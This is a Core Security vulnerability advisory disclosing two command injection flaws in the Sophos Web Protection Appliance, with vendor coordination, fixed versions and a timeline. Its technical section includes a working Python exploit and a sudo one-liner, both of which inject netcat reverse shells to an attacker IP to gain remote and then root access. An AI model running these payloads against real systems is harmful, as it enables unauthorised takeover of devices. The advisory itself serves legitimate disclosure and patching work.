@@ -1,0 +1,401 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com/
+
+Sophos Web Protection Appliance Multiple Vulnerabilities
+
+
+1. *Advisory Information*
+
+Title: Sophos Web Protection Appliance Multiple Vulnerabilities
+Advisory ID: CORE-2013-0809
+Advisory URL:
+http://www.coresecurity.com/advisories/sophos-web-protection-appliance-multiple-vulnerabilities
+Date published: 2013-09-06
+Date of last update: 2013-09-06
+Vendors contacted: Sophos
+Release mode: Coordinated release
+
+
+2. *Vulnerability Information*
+
+Class: OS command injection [CWE-78], OS command injection [CWE-78]
+Impact: Code execution, Security bypass
+Remotely Exploitable: Yes
+Locally Exploitable: No
+CVE Name: CVE-2013-4983, CVE-2013-4984
+
+
+3. *Vulnerability Description*
+
+Sophos Web Protection Appliance [1] provides advanced web malware
+protection, URL filtering and content control (including scanning of
+HTTPS traffic) in a Secure Web Gateway appliance. Sophos Web Protection
+Appliance is available both as a hardware appliance and as a VMware
+virtual appliance.
+
+Multiple vulnerabilities have been found in Sophos Web Protection
+Appliance that could allow an unauthenticated remote attacker to execute
+arbitrary OS commands and escalate privileges to gain root permissions
+within the appliance. The OS command injection vulnerability can be
+exploited by remote unauthenticated attackers that can reach the web
+interface of the appliance. The privilege escalation vulnerability
+allows an attacker that already gained code execution on the appliance
+to escalate privileges from the operating system user 'spiderman' to
+'root'.
+
+
+4. *Vulnerable Packages*
+
+   . Sophos Web Appliance v3.7.9 and earlier.
+   . Sophos Web Appliance v3.8.0.
+   . Sophos Web Appliance v3.8.1.
+   . Other versions may be affected too but they were no checked.
+
+5. *Non-Vulnerable Packages*
+
+   . Sophos Web Protection Appliance v3.7.9.1.
+   . Sophos Web Protection Appliance v3.8.1.1.
+
+6. *Vendor Information, Solutions and Workarounds*
+
+Sophos published release notes and a knowledgebase article acknowledging
+the issue and the assistance given by Core Security in tracking it down
+[2][3].
+
+
+7. *Credits*
+
+This vulnerability was discovered and researched by Francisco Falcon
+from Core Exploit Writers Team. The publication of this advisory was
+coordinated by Fernando Miranda from Core Advisories Team.
+
+
+8. *Technical Description / Proof of Concept Code*
+
+ 
+
+
+8.1. *Pre-authentication OS command injection vulnerability*
+
+[CVE-2013-4983] The file '/opt/ui/apache/htdocs/end-user/index.php' can
+be accessed by unauthenticated users at
+'https://<WPA_server>/end-user/index.php'. It also can be reached
+through plain HTTP at 'http://<WPA_server>/index.php', since Apache's
+'httpd.conf' configuration file defines a VirtualHost at port 80 having
+DocumentRoot '/opt/ui/apache/htdocs/end-user/'. The 'run()' function in
+this PHP script obtains the requested controller from its 'c' GET
+parameter and calls the appropriate handler.
+
+Available handlers are defined in
+'/opt/ui/apache/htdocs/config/UsrSiteflow.php':
+
+
+/-----
+<?php
+require_once('AbstractSiteFlow.php');
+class UsrSiteflow extends AbstractSiteFlow {
+    public function __construct() {
+        $this->flow = array(
+            "index" => "UsrBlocked.php",
+            "blocked" => "UsrBlocked.php",        
+            "invalid_certificate" => "UsrBlocked.php",
+            "rss" => "UsrRss.php",
+        );
+    }
+}
+?>
+-----/
+
+That means that, for example, when requesting
+'https://<WPA_server>/end-user/index.php?c=blocked', the
+'UsrBlocked.php' script will be used to render the page. Looking at the
+code in '/opt/ui/apache/htdocs/controllers/UsrBlocked.php':
+
+/-----
+<?php
+[...]
+    if(isset($_GET['action'])) {
+    if($_GET['action'] == 'continue') {
+                // use sblistpack to allow access
+                $url = base64_decode($_POST['url']);
+        $scheme = parse_url($url,PHP_URL_SCHEME);
+        if($scheme == "https" &&
+$this->config->read('wsa_proxy.https_scan') != 'yes') {
+        $host = parse_url($url,PHP_URL_HOST);
+        $args['url'] = $scheme . '://' . $host;
+        } else {
+        $args['url'] = $url;
+                }
+        if($_POST['args_reason'] == 'filetypewarn') {
+        $key = $_POST['url'];
+        $packer = '/opt/ws/bin/ftsblistpack';
+        $value = $_POST['filetype'];
+        }
+        else {
+            $key = $_POST['domain'];
+            $packer = '/opt/ws/bin/sblistpack';
+            $catParts = explode("|",$_POST['raw_category_id']);
+            $value = $catParts[0];
+        }
+        if(strlen(trim($_POST['user'])) > 0)
+            $user = base64_decode($_POST['user_encoded']);
+        else
+            $user = $_POST['client-ip'];
+            if($user == '-') $user = $_POST['client-ip'];
+
+            $key = escapeshellarg($key);
+            $user = escapeshellarg($user);
+            $value = escapeshellarg($value);
+        shell_exec("$packer $key $user $value");
+[...]
+?>      
+-----/
+
+we can see that the Perl script '/opt/ws/bin/sblistpack' will be
+executed when the following conditions are met:
+
+   1. the 'action' GET parameter is set to 'continue', and
+   2. the 'args_reason' POST parameter is set to anything different that
+'filetypewarn';
+Variables whose content is controlled by the user '($key, $user,
+$value)' are properly escaped by using 'escapeshellarg()' before calling
+'shell_exec()', making the UsrBlocked.php script not vulnerable to OS
+command injection at that point. However, the invoked
+'/opt/ws/bin/sblistpack' Perl script itself is vulnerable to OS command
+injection, because its 'get_referers()' function doesn't escape the
+first argument of the script before using it within a string that will
+be executed as a command by using backticks:
+
+
+/-----
+sub get_referers {
+    my $domain = shift;
+
+    if(! -f $referer_list) {
+        return ();
+    }
+
+    # handle multiple google domains (e.g. google.co.uk)
+    if($domain =~ /^google\./) {
+        $domain = 'google.com';
+    }
+
+    my $output = `/opt/ws/bin/kvlistquery $referer_list $domain`;
+    chomp $output;
+
+    if($output =~ /'(.*)'$/) {
+        my $sites = $1;
+        return split('\|', $sites);
+    }
+    return ();
+}
+
+-----/
+
+so, by setting the 'domain' POST parameter to a value like:
+
+
+/-----
+http://example.com;/bin/nc -c /bin/bash 192.168.1.100 4444
+-----/
+
+an unauthenticated remote attacker can execute arbitrary OS commands on
+the Sophos appliance with the privileges of the 'spiderman' operating
+system user.
+
+
+8.1.1. *Proof of Concept*
+
+The following Python script exploits the pre-authentication OS command
+injection vulnerability and executes '/bin/nc -c /bin/bash 192.168.1.100
+4444' on a vulnerable Sophos Web Protection Appliance in order to gain a
+reverse shell on attacker's machine at 192.168.1.100:
+
+
+/-----
+import sys
+import httplib
+
+def main():
+    if len(sys.argv) < 2:
+        print "Usage: sophos_wpa_command_injection.py <target_ip>"
+        sys.exit(1)
+
+    host = sys.argv[1]
+    port = 443
+
+    headers = {'Host': host,
+               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64;
+rv:21.0) Gecko/20100101 Firefox/21.0',
+               'Accept':
+'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+               'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
+               'Accept-Encoding': 'gzip, deflate',
+               'Connection': 'keep-alive',
+               'Content-Type': 'application/x-www-form-urlencoded'
+               }
+
+    body  = 'url=aHR0cDovL3d3dy5leGFtcGxlLmNvbQ%3d%3d'
+    body +=
+'&args_reason=something_different_than_filetypewarn&filetype=dummy&user=buffalo'
+    body +=
+'&user_encoded=YnVmZmFsbw%3d%3d&domain=http%3a%2f%2fexample.com%3b%2fbin%2fnc%20-c%20%2fbin%2fbash%20192.168.1.100%204444'
+    body += '&raw_category_id=one%7ctwo%7cthree%7cfour'
+
+    conn = httplib.HTTPSConnection(host, port)
+    conn.request('POST',
+'/end-user/index.php?c=blocked&action=continue', body=body, headers=headers)
+    
+    #Don't wait for the server response since it will be blocked by the
+spawned shell
+    conn.close()
+    print 'Done.'
+
+if __name__ == '__main__':
+    main()      
+-----/
+
+
+8.2. *Privilege escalation through local OS command injection vulnerability*
+
+[CVE-2013-4984] The Apache web server within the Sophos appliance runs
+under the 'spiderman' user. The '/etc/sudoers' file defines a list of
+Bash and Perl scripts that the 'spiderman' user can run with the 'sudo'
+command:
+
+
+/-----
+spiderman ALL=NOPASSWD:/opt/sophox/bin/configure_interface, \
+                       /opt/sophox/bin/sophox-register, \
+                       /opt/sophox/bin/sophox-remote-assist, \
+                       [...]
+                       /opt/cma/bin/clear_keys.pl, \
+                       [...]
+-----/
+
+The Perl script '/opt/cma/bin/clear_keys.pl' is vulnerable to OS command
+injection, because its 'close_connections()' function:
+
+
+/-----
+sub close_connections {
+    my ($client_ip, $signum, $signame) = @_;
+
+    my @connections = `/bin/netstat -nap|grep ^tcp.*:22.*$client_ip.*EST`;
+    foreach (@connections) {
+        if(/ESTABLISHED\s*(\d+)\/sshd/) {
+            my $conn_pid = $+;
+            log_info("connection PID: $conn_pid; my PID: $$; my process
+tree: " . join(', ', @my_process_tree));
+            next if (grep {$_ == $conn_pid}  @my_process_tree);
+            log_info("Attempting to stop process '$conn_pid' with
+$signame");
+            kill $signum, $conn_pid;
+        }
+    }
+}      
+-----/
+
+doesn't escape the second argument of the script before using it within
+a string that will be executed as a command by using backticks. Since it
+can be run by the 'spiderman' user with the 'sudo' command, it can be
+abused to gain root privileges within the appliance.
+
+The following command can be executed within a compromised Web
+Protection Appliance to escalate privileges from 'spiderman' user to
+root and gain a reverse root shell on attacker's machine at 192.168.1.100:
+
+
+/-----
+$ sudo /opt/cma/bin/clear_keys.pl fakeclientfqdn ";/bin/nc -c /bin/bash
+192.168.1.100 5555;" /fakedir
+-----/
+
+
+9. *Report Timeline*
+
+. 2013-08-12:
+Core Security Technologies notifies the Sophos team of the vulnerability
+and sends a technical report. Publication date is set for Sep 4th, 2013.
+
+. 2013-08-13:
+Vendor acknowledges Core Security Technologies's e-mail, confirms the
+issues and notifies that they are working on a resolution and a release
+plan.
+
+. 2013-08-14:
+Vendor notifies that they are expecting to release a fixed version in
+the first week of September. Vendor also notifies that they are also in
+the middle of an extended rollout of a new version of the product and
+would like to make this fix available to customers on both the new and
+old versions of the product, which increases the amount of testing
+involved. Sophos team asks for delay the advisory publication one week
+(Sep 11th).
+
+. 2013-08-20:
+Core re-schedules the advisory publication for Sep 11th, 2013.
+
+. 2013-09-05:
+Vendor notifies that they completed the testing early and the fixed
+version of the Web Appliance is scheduled for tomorrow, Friday 6th.
+Vendor also notifies that they have published release notes and a
+knowledgebase article acknowledging the issues [2][3].
+
+. 2013-09-06:
+Advisory CORE-2013-0809 published.
+
+
+10. *References*
+
+[1]
+http://www.sophos.com/medialibrary/PDFs/factsheets/sophoswebappliancesdsna.pdf.
+
+[2] http://www.sophos.com/en-us/support/knowledgebase/119773.aspx.
+[3]
+http://ca-repo1.sophos.com/docs/ws1000/ws1000/concepts/ReleaseNotes_3.8.1.1.html.
+
+
+
+11. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct our research in several important
+areas of computer security including system vulnerabilities, cyber
+attack planning and simulation, source code auditing, and cryptography.
+Our results include problem formalization, identification of
+vulnerabilities, novel solutions and prototypes for new technologies.
+CoreLabs regularly publishes security advisories, technical papers,
+project information and shared software tools for public use at:
+http://corelabs.coresecurity.com.
+
+
+12. *About Core Security Technologies*
+
+Core Security Technologies enables organizations to get ahead of threats
+with security test and measurement solutions that continuously identify
+and demonstrate real-world exposures to their most critical assets. Our
+customers can gain real visibility into their security standing, real
+validation of their security controls, and real metrics to more
+effectively secure their organizations.
+
+Core Security's software solutions build on over a decade of trusted
+research and leading-edge threat expertise from the company's Security
+Consulting Services, CoreLabs and Engineering groups. Core Security
+Technologies can be reached at +1 (617) 399-6980 or on the Web at:
+http://www.coresecurity.com.
+
+
+13. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2013 Core Security
+Technologies and (c) 2013 CoreLabs, and are licensed under a Creative
+Commons Attribution Non-Commercial Share-Alike 3.0 (United States)
+License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+
+14. *PGP/GPG Keys*
+
+This advisory has been signed with the GPG key of Core Security
+Technologies advisories team, which is available for download at
+http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
